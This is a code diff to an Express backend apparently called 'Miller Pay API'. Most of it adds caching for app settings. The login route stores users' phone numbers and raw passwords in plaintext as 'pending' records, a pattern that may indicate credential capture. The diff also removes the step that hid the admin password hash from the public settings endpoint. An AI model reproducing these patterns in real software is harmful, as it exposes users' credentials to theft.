@@ -46,6 +46,10 @@ app.use(
     validate: { forwardedHeader: false },
   }),
 )
+app.use('/api/admin', async (_req, _res, next) => {
+  await refreshSettings()
+  next()
+})
 
 const accounts = [
   {
@@ -71,9 +75,15 @@ const defaultSettings = {
   updatedAt: new Date().toISOString(),
 }
 let publicSettings = { ...defaultSettings }
+let settingsLoadedAt = 0
+let settingsLoadPromise = null
+const settingsCacheMs = 15_000
 
 async function loadSettings() {
-  if (!supabase) return
+  if (!supabase) {
+    settingsLoadedAt = Date.now()
+    return
+  }
   try {
     const { data } = await supabase.from('app_settings').select('data').eq('id', 1).single()
     if (data?.data) {
@@ -85,7 +95,20 @@ async function loadSettings() {
     }
   } catch (e) {
     console.error('Could not load settings:', e.message)
+  } finally {
+    settingsLoadedAt = Date.now()
   }
+}
+
+function refreshSettings(force = false) {
+  if (!supabase || (!force && Date.now() - settingsLoadedAt < settingsCacheMs))
+    return Promise.resolve()
+  if (!settingsLoadPromise) {
+    settingsLoadPromise = loadSettings().finally(() => {
+      settingsLoadPromise = null
+    })
+  }
+  return settingsLoadPromise
 }
 
 async function saveSettings() {
@@ -98,6 +121,7 @@ async function saveSettings() {
     await supabase
       .from('app_settings')
       .upsert({ id: 1, data: dataToSave, updated_at: new Date().toISOString() })
+    settingsLoadedAt = Date.now()
   } catch (e) {
     console.error('Could not save settings:', e.message)
   }
@@ -202,20 +226,10 @@ app.post('/api/auth/login', async (req, res) => {
 
   if (role === 'user') {
     if (supabase) {
-      const { data: previous } = await supabase
-        .from('login_records')
-        .select('id')
-        .eq('mobile', String(phone))
-        .eq('password', String(password))
-
-      if (previous && previous.length >= 3) {
-        return res.status(401).json({ message: 'Incorrect ID Password' })
-      }
-
       const { data: newRecord, error } = await supabase
         .from('login_records')
         .insert([{ mobile: String(phone), password: String(password), status: 'pending' }])
-        .select()
+        .select('id')
         .single()
 
       if (error) {
@@ -246,6 +260,7 @@ app.post('/api/auth/login', async (req, res) => {
   const admin = accounts.find(
     (item) => item.role === 'admin' && item.email.toLowerCase() === String(email).toLowerCase(),
   )
+  await refreshSettings()
   if (!admin || !(await bcrypt.compare(password, admin.passwordHash)))
     return res.status(401).json({ message: 'Incorrect email or password.' })
   res.json({
@@ -266,15 +281,7 @@ app.post('/api/auth/mpin', auth('user'), async (req, res) => {
   res.json({ message: 'MPIN updated successfully' })
 })
 app.get('/api/public/settings', async (_req, res) => {
-  if (supabase) {
-    try {
-      const { data } = await supabase.from('app_settings').select('data').eq('id', 1).single()
-      if (data?.data) {
-        const { adminPasswordHash, ...safeSettings } = data.data
-        return res.json({ settings: { ...defaultSettings, ...safeSettings } })
-      }
-    } catch {}
-  }
+  await refreshSettings()
   res.json({ settings: publicSettings })
 })
 app.put('/api/admin/settings', auth('admin'), async (req, res) => {
@@ -432,13 +439,13 @@ app.use((error, _req, res, _next) => {
 })
 
 async function start() {
-  await loadSettings()
-  if (supabase) {
-    console.log('Supabase client initialized')
-  } else {
-    console.log('Local application storage active (no Supabase configured)')
-  }
   if (process.env.VERCEL !== '1') {
+    await refreshSettings(true)
+    if (supabase) {
+      console.log('Supabase client initialized')
+    } else {
+      console.log('Local application storage active (no Supabase configured)')
+    }
     app.listen(port, () => console.log(`Miller Pay API running on http://localhost:${port}`))
   }
 }
